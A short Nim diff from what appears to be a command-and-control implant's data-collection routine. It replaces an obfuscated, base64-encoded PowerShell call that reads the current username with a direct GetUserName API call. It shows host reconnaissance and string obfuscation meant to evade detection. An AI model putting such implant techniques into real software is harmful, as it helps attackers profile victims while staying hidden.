@@ -13,6 +13,7 @@ import threadpool
 import nimprotect
 import strformat
 import strutils
+import sequtils
 import osproc
 import crc32
 import os
@@ -80,7 +81,10 @@ proc collect_data(): bool =
     except:
         process = could_not_retrieve
     try:
-        username = execute_encoded_powershell(protectString("WwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkALgBuAGEAbQBlAAoA"))
+        var username_c: array[256, TCHAR]
+        var username_c_len: DWORD = 256
+        GetUserName(addr username_c[0], addr username_c_len)
+        username = $username_c.mapIt(it.chr).join()
     except:
         username = could_not_retrieve
     try:
